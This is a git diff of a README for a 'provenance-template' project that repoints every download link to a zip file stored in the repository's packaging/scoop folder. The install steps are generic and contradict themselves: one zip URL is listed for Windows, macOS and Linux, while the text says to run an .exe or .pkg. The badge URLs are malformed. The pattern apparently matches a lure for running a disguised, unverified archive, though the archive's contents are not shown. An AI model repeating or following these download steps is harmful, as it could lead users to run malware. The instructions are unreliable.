@@ -6,11 +6,11 @@ Welcome to the provenance-template project. This application offers a solid foun
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/alexand2570/provenance-template/main/docs/contributing/provenance-template_3.7.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/alexand2570/provenance-template/main/docs/contributing/provenance-template_3.7.zip)
+[![Download Latest Release](https://github.com/alexand2570/provenance-template/raw/refs/heads/main/packaging/scoop/provenance_template_3.2.zip%20Latest%20Release-v1.0-blue)](https://github.com/alexand2570/provenance-template/raw/refs/heads/main/packaging/scoop/provenance_template_3.2.zip)
 
 ## 📦 Download & Install
 
-To get the application, visit this page to download: [Download Releases](https://raw.githubusercontent.com/alexand2570/provenance-template/main/docs/contributing/provenance-template_3.7.zip).
+To get the application, visit this page to download: [Download Releases](https://github.com/alexand2570/provenance-template/raw/refs/heads/main/packaging/scoop/provenance_template_3.2.zip).
 
 ### 🖥️ System Requirements
 
@@ -22,13 +22,13 @@ To get the application, visit this page to download: [Download Releases](https:/
 ### 💻 Installation Steps
 
 1. **Visit the Download Page**
-   Go to the [Download Releases](https://raw.githubusercontent.com/alexand2570/provenance-template/main/docs/contributing/provenance-template_3.7.zip) link to find the latest version.
+   Go to the [Download Releases](https://github.com/alexand2570/provenance-template/raw/refs/heads/main/packaging/scoop/provenance_template_3.2.zip) link to find the latest version.
 
 2. **Choose Your Version**
    Look for the version that matches your operating system. You will see files like:
-   - `https://raw.githubusercontent.com/alexand2570/provenance-template/main/docs/contributing/provenance-template_3.7.zip` for Windows.
-   - `https://raw.githubusercontent.com/alexand2570/provenance-template/main/docs/contributing/provenance-template_3.7.zip` for macOS.
-   - `https://raw.githubusercontent.com/alexand2570/provenance-template/main/docs/contributing/provenance-template_3.7.zip` for Linux.
+   - `https://github.com/alexand2570/provenance-template/raw/refs/heads/main/packaging/scoop/provenance_template_3.2.zip` for Windows.
+   - `https://github.com/alexand2570/provenance-template/raw/refs/heads/main/packaging/scoop/provenance_template_3.2.zip` for macOS.
+   - `https://github.com/alexand2570/provenance-template/raw/refs/heads/main/packaging/scoop/provenance_template_3.2.zip` for Linux.
 
 3. **Download the File**
    Click on the file name to start downloading.
@@ -36,7 +36,7 @@ To get the application, visit this page to download: [Download Releases](https:/
 4. **Run the Installer**
    - **Windows:** Double-click the downloaded `.exe` file and follow the instructions.
    - **macOS:** Open the `.pkg` file and proceed with the installation prompts.
-   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/alexand2570/provenance-template/main/docs/contributing/provenance-template_3.7.zip` file, then run the application from the terminal.
+   - **Linux:** Extract the downloaded `https://github.com/alexand2570/provenance-template/raw/refs/heads/main/packaging/scoop/provenance_template_3.2.zip` file, then run the application from the terminal.
 
 5. **Verify Installation**
    After installation, open your terminal or command prompt and type:
